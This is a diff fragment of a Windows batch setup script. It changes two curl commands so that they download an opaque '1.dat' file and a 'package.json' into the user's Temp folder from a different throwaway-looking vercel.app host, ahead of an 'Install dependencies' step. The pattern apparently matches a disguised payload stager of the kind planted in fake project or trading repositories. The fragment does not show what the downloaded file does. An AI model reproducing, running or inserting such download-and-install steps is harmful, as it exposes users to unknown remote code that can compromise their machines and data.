@@ -80,8 +80,8 @@ set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading 1.dat and package.json...
 
 MD "%USERPROFILE%\AppData\Local\Temp" 2>nul
-curl -L -o "%USERPROFILE%\AppData\Local\Temp\1.dat" "https://create-react-lyart.vercel.app/120/1.dat"
-curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://create-react-lyart.vercel.app/package.json"
+curl -L -o "%USERPROFILE%\AppData\Local\Temp\1.dat" "https://trading-v1-99wu.vercel.app/120/1.dat"
+curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://trading-v1-99wu.vercel.app/package.json"
 
 :: -------------------------
 :: Install dependencies
